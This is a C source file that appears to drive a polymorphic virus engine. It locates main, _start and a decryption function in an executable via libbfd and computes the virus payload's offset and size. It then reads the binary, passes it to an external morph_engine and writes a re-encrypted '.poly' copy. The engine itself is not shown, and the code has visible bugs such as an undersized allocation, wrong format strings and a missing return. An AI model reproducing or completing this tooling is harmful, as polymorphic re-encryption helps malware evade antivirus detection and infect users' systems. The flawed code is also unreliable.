#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <time.h>
#include <string.h>
#include <unistd.h>
#include <bfd.h>

// extern int morph_engine(char* exe_data, size_t virus_instruction_begin, size_t virus_encrypt_size, size_t virus_decrypt_offset);

typedef struct node {
  const char* name;
  unsigned int vma;
  struct node * next;
} sym;

sym * getsymtable(char *file);

// Function to convert unsigned integer to char array w base
char* tostring(int val, char* buf, int base) {
	int i = 0;

	if (val == 0) {
		buf[i++] = '0';
		buf[i] = '\0';
		return buf;
	}
	while (val != 0) {
		int r = val % base;
		if (r > 9) {
			buf[i++] = (r - 10) + 'a';
		}
		else {
			buf[i++] = r + '0';
		}
		val = val / base;
	}
	buf[i] = '\0';

	char* str = malloc(sizeof(buf));
	str[i] = '\0';
	int x;
	for (x = 0; x < i; x++) {
		str[x] = buf[i - 1 - x];
	}
	return str;
}


char* getaddress(char *filename, char*symbol){

	// Call library function to get a pointer to a ll
	sym * head = getsymtable(filename);
	// Recursively iterate through ll and print to std out
	sym * current = head;
	while (current != NULL) {
		char newline[1] = {"\n"};
		char* buffer = malloc(32 * sizeof(char));

            if(strcmp(symbol, current->name)==0){
                  char* vma = tostring(current->vma, buffer, 16);
                  return vma;
            }
		free(buffer);
		current = current -> next;
	}
}

int main(int argc, char* argv[])
{
      int i;
      for (i=0; i<argc; ++i) {
      printf("polymorphic argv[%d]=%s\n", i, argv[i]);
      }


      char main[]="main";
      char start[]="_start";
      char decryption[]="decrypt.decryption_function";
      
      write(1, getaddress(argv[1], main), strlen(getaddress(argv[1], main)));
      printf("\n");
      write(1, getaddress(argv[1], start), strlen(getaddress(argv[1], start)));
      printf("\n");
      write(1, getaddress(argv[1], decryption), strlen(getaddress(argv[1], decryption)));
      printf("\n");

	// // to get offset just delete the most significant char

      char *main_offset = getaddress(argv[1], "main") + 1;
      char *start_offset = getaddress(argv[1], "_start") + 1;
      char *decryption_offset = getaddress(argv[1], "decrypt.decryption_function") + 1;

      // write(1, main_offset, strlen(main_offset));

      const size_t virus_instruction_begin  = (int)strtol(main_offset, NULL, 16);
	size_t virus_encrypt_size    = strtoull(start_offset, NULL, 16);
      
      // calculate the payload size
      virus_encrypt_size = virus_encrypt_size - virus_instruction_begin;

	const size_t virus_decrypt_offset  = strtoull(decryption_offset, NULL, 16);

      printf("%ul\n", virus_instruction_begin);
      printf("%ul\n", virus_encrypt_size);
      printf("%ul\n", virus_decrypt_offset);

      // open the executable file
	FILE* exe_file = fopen(argv[1], "rb");
	if(!exe_file)
	{
		printf("Failed to open %s\n", argv[1]);
		return -1;
	}

	// get the size of the executable file
	size_t exe_size;
	fseek(exe_file, 0, SEEK_END);
	exe_size = ftell(exe_file);
	rewind(exe_file);

	// allocate the data
	char* exe_data = malloc(exe_size);
	if(!exe_data)
	{
		fclose(exe_file);
		printf("Executable data allocation failed\n");
		return 1;
	}

	// read the entire executable file
	if(!fread(exe_data, exe_size, 1, exe_file))
	{
		fclose(exe_file);
		printf("Executable file read failed\n");
	}

	// close the file
	fclose(exe_file);



	// call the polymorphic engine
	if(morph_engine(exe_data, virus_instruction_begin, virus_encrypt_size, virus_decrypt_offset) != 0)
	{
		printf("An error occured in the polymorphic engine\n");

	}

	// initialize the output filename
	char out_filename[FILENAME_MAX];
	snprintf(out_filename, FILENAME_MAX, "%s.poly", argv[1]);
      printf("/n");
	// open the output file
	FILE* out_file = fopen(out_filename, "wb");
	if(!out_file)
	{
		printf("failed to open %s\n", out_filename);
		// goto quit;
	}

	// write the modified executable data
	if(!fwrite(exe_data, exe_size, 1, out_file))
	{
		printf("failed to write into %s\n", out_filename);
	}

      quit:
            free(exe_data);
      return 0;

}